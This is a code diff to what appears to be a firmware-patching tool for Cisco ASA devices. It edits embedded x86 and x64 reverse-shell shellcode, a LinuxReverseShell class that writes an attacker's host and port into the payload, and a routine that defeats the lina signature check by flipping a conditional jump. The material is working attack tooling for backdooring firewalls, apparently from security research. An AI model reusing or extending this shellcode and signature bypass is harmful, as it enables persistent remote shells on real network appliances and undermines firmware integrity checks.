@@ -45,7 +45,7 @@ def logmsg(s):
 # To format in vim visual select hex strings and run :
 # '<,'>s/\(\(\\x..\)\{16\}\)/"\1"\r/g
 sc_debug_shell_32 = (
-b"\xb8\x77\x77\x77\x77\xff\xd0\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0"
+b"\x90\x90\xe8\x77\x77\x77\x77\xb8\x02\x00\x00\x00\xcd\x80\x85\xc0"
 b"\x0f\x85\xa1\x01\x00\x00\xba\xed\x01\x00\x00\xb9\xc2\x00\x00\x00"
 b"\x68\x2f\x73\x68\x00\x68\x2f\x74\x6d\x70\x8d\x1c\x24\xb8\x05\x00"
 b"\x00\x00\xcd\x80\x50\xeb\x31\x59\x8b\x11\x8d\x49\x04\x89\xc3\xb8"
@@ -75,8 +75,8 @@ b"\xe3\x52\x57\x53\x8d\x0c\x24\xb8\x0b\x00\x00\x00\xcd\x80\x31\xdb"
 b"\xb8\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xc3")
 
 sc_debug_shell_64 = (
-b"\x55\x53\x41\x54\x41\x55\x41\x56\x41\x57\x48\xb8\x77\x77\x77\x77"
-b"\x77\x77\x77\x77\xff\xd0\x48\xc7\xc0\x39\x00\x00\x00\x0f\x05\x48"
+b"\x55\x53\x41\x54\x41\x55\x41\x56\x41\x57\x90\x90\x90\x90\x90\x90"
+b"\x90\xe8\x77\x77\x77\x77\x48\xc7\xc0\x39\x00\x00\x00\x0f\x05\x48"
 b"\x85\xc0\x0f\x85\xc2\x01\x00\x00\x48\xc7\xc2\xed\x01\x00\x00\x48"
 b"\xc7\xc6\xc2\x00\x00\x00\x48\x83\xec\x08\x48\x8d\x3c\x24\xc7\x07"
 b"\x2f\x74\x6d\x70\xc7\x47\x04\x2f\x73\x68\x00\x48\xc7\xc0\x02\x00"
@@ -111,15 +111,16 @@ b"\x41\x5c\x5b\x5d\x48\xc7\xc0\x01\x00\x00\x00\xc3")
 # Builds a Linux reverse shell payload based on some parameters
 # like information for a target and a host/port to connect to
 class LinuxReverseShell(object):
-    def __init__(self, c):
+    def __init__(self, c, scratch_off):
         self._revHost           = c["revHost"]
         self._revPort           = c["revPort"]
         self._target            = c["target"]
         self._missingSymbols    = []
         self._shellcode         = None
+        self._scratch_off       = scratch_off
 
     def replaceSymbol(self, pattern, symbolname, mask=0xffffffffffffffff, 
-            use_slide=True):
+            use_slide=False):
         slide = 0x0
         if use_slide:
             slide = self._target["lina_imagebase"]
@@ -135,8 +136,9 @@ class LinuxReverseShell(object):
             for s in symbolname:
                 try:
                     addr = self._target['addresses'][s] & mask
-                    self._shellcode = self._shellcode.replace(pattern, \
-                            struct.pack(fmt, (slide + addr)))
+                    jmp_offset = self._get_relative_jmp_offset(addr, pattern)
+                    self._shellcode = self._shellcode.replace(pattern,
+                            struct.pack(fmt, jmp_offset))
                 except KeyError:
                     continue
                 else:
@@ -147,20 +149,26 @@ class LinuxReverseShell(object):
         else:
             try:
                 addr = self._target['addresses'][symbolname] & mask
+                jmp_offset = self._get_relative_jmp_offset(addr, pattern)
                 self._shellcode = self._shellcode.replace(pattern, 
-                        struct.pack(fmt, (slide + addr)))
+                        struct.pack(fmt, jmp_offset))
             except KeyError:
                 self._missingSymbols.append(symbolname)
+
+    def _get_relative_jmp_offset(self, target_addr, pattern, mask=0xffffffffffffffff):
+        jmp_next_ins_addr = (self._scratch_off & mask) + self._shellcode.find(pattern) + len(pattern)
+        jmp_offset = target_addr - jmp_next_ins_addr
+        if jmp_offset < 0:
+            jmp_offset = (1<<32) + jmp_offset
+        return jmp_offset
 
     def buildShellcode(self):
         if self._target["arch"] == 64:
             self._shellcode = sc_debug_shell_64
-            self.replaceSymbol(b'\x77\x77\x77\x77\x77\x77\x77\x77', 
-                ['start_loopback_proxy', 'socks_proxy_server_start'])
         else:
             self._shellcode = sc_debug_shell_32
-            self.replaceSymbol(b'\x77\x77\x77\x77', 
-                ['start_loopback_proxy', 'socks_proxy_server_start'])
+        self.replaceSymbol(b'\x77\x77\x77\x77',
+            ['start_loopback_proxy', 'socks_proxy_server_start'])
         # XXX clean this 
         self._shellcode = self._shellcode.replace(b'\xaa\xbb\xcc\xdd', 
                 socket.inet_aton(self._revHost)).replace(b'\x88\x88', 
@@ -175,7 +183,7 @@ class LinuxReverseShell(object):
 def inject_debug_shell(config, indata, scratch_off):
     logmsg("Installing debug shell at 0x%x" % scratch_off)
     c = config
-    rev = LinuxReverseShell(c)
+    rev = LinuxReverseShell(c, scratch_off)
     if rev.buildShellcode() != True:
         logmsg("Target not completely supported yet. Missing symbols:")
         logmsg(rev._missingSymbols)
@@ -205,16 +213,28 @@ def inject_debug_shell(config, indata, scratch_off):
 # jz short loc_39B6 == "74 50" == je 0x52
 # by:
 # jmp 0x52 == "eb 50"
+# e.g. asav9101
+# .text:00000000000031C4 E8 F7 2C 00+   call    code_sign_verify_signature_image
+# .text:00000000000031C9 85 C0          test    eax, eax
+# .text:00000000000031CB 89 C3          mov     ebx, eax
+# .text:00000000000031CD 0F 85 33 0B+   jnz     loc_3D06
+# Patch is to replace:
+# jnz     loc_3D06  ("0F 85 33 0B+ " seems strange!!!)
+# by
+# jz      loc_3D06  ("0F 84 33 0B+ " seems strange!!!)
+# Note: can't replace jnz by jmp in this case, for the branch loc_3D06 is the "error" branch
 def patch_lina_signature_check(config, indata, scratch_off):
     logmsg("Patching lina signature check at 0x%x" % scratch_off)
     c = config
-    
-    if indata[scratch_off:scratch_off+1] != b"\x74":
+    if indata[scratch_off:scratch_off+1] == b"\x74":
+        outdata = indata[:scratch_off] + b"\xeb" \
+               + indata[scratch_off+1:]
+    elif indata[scratch_off:scratch_off+2] == b"\x0f\x85":
+        outdata = indata[:scratch_off+1] + b"\x84" \
+                + indata[scratch_off+2:]
+    else:
         logmsg("Error: Opcode not supported. We only support jz for now: Found: 0x%x" % ord(indata[scratch_off:scratch_off+1]))
         sys.exit(1)
-    
-    outdata = indata[:scratch_off] + b"\xeb" \
-               + indata[scratch_off+1:]
     logmsg("Patched lina_monitor offset: 0x%x with len = 1 bytes (SIGN CHECK)" % 
             (scratch_off))
 
